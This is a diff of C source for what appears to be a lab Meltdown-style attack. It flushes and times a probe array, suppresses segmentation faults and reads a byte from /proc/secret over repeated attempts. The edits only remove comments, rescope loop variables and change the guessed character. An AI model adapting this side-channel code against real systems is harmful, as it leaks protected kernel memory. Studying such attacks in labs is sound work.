@@ -36,7 +36,7 @@ void doflush()
 {
   int i;
 
-  // FLush the array elements that could be cached
+  
   for (i=0; i<256; i++)
   _mm_clflush(&array[i*4096]);
 }
@@ -45,7 +45,7 @@ void reload()
 {
   int i;
   uint64_t start, end;
-  // Reload the array and check hits
+  // Reload array and check hits
   register uint64_t time1, time2;
   int *addr;
 
@@ -57,7 +57,7 @@ void reload()
    end = rdtsc();
    if ((end - start) <= CACHE_HIT_THRESHOLD)
     {
-	if (i == 'N')    //  secret value
+	if (i == 'X')    //  secret value
  		count++;
       }
   }
@@ -92,9 +92,9 @@ asm volatile(
 
 int main()
 {
-  int i, j, ret=0;      // change ret var name later
+  int ret=0; 
 
-  // Registering Signal handler for SIGSEGV
+  
   signal(SIGSEGV, handle_segfault);
   int fd = open("/proc/secret", O_RDONLY);
 
@@ -103,11 +103,11 @@ int main()
     return -1;
   }
   doflush();
-  // Retry 1000 times on the same address.
+  
 
   int fault_code;
  count = 0; 
- for (i = 0; i < 1000; i++) {
+ for (int i = 0; i < 1000; i++) {
     ret = pread(fd, NULL, 0, 0); 
     if (ret < 0) {
       perror("pread");
@@ -115,7 +115,7 @@ int main()
     }
   
   // Flush the probing array
-  for (j = 0; j < 256; j++) 
+  for (int j = 0; j < 256; j++) 
     _mm_clflush(&array[j * 4096]);
   
   fault_code = sigsetjmp(restore_point, 1);
